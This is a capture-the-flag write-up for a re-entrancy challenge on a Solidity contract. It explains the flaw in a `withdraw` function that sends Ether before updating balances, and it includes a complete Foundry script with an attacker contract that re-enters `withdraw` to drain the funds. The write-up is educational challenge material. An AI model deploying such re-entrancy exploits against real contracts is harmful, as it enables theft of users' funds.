# Re-entrancy   
In this challenge, the goal is to drain all the funds from the instance contract. The name of the challenge provides a strong hint about the vulnerability we need to exploit: re-entrancy.

The issue lies in the `withdraw` function of the contract. Specifically, the function performs an external call (`call`) to send Ether before updating the `balances` mapping. This creates a classic re-entrancy vulnerability.
   
```solidity
function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }
```
To solve this challenge, we can deploy a malicious contract that exploits the re-entrancy vulnerability. The contract will implement a `receive` function that repeatedly calls the `withdraw` function of the target contract before the `balances` mapping is updated. This allows us to drain the contract's funds in a single transaction.

Here’s the script I used to automate the attack:  
```solidity
//SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Script} from "forge-std/Script.sol";

interface Ivictim { function withdraw(uint256 _amount) external; }

contract AttackScript is Script {
	AttackContract attackContract;
	
	function run() public {
	vm.startBroadcast();
	attackContract = new AttackContract{value: 0.001 ether}( /* Your instance address */ );
	attackContract.attack();
	vm.stopBroadcast();
}

}

contract AttackContract {
	address victim;	
	uint256 amount;	

	constructor(address _victim) payable {
	victim = _victim;
}
	receive() external payable {
	try Ivictim(victim).withdraw(0.001 ether) {} catch {}
}

	function attack() external {
	victim.call{value: 0.001 ether}(abi.encodeWithSignature("donate(address)", address(this)));
	victim.call(abi.encodeWithSignature("withdraw(uint256)", 0.001 ether));
	msg.sender.call{value: 0.002 ether}("");
}
}
```
